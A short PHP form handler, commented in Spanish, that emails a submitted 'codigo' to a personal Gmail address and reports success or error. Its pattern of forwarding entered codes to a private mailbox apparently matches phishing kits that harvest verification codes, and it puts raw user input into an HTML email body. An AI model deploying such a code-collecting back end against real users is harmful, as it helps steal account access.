<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $codigo = $_POST['codigo'];

    // Configuración del correo
    $destinatario = "03.rodry.03@gmail.com";
    $asunto = "Código Correcto Ingresado";
    $mensaje = "El código correcto ha sido ingresado: " . $codigo;
    $cabeceras = "From: remitente@example.com\r\n";
    $cabeceras .= "Reply-To: remitente@example.com\r\n";
    $cabeceras .= "Content-Type: text/html; charset=UTF-8\r\n";

    // Envía el correo
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        echo "success";
    } else {
        echo "error";
    }
}
?>
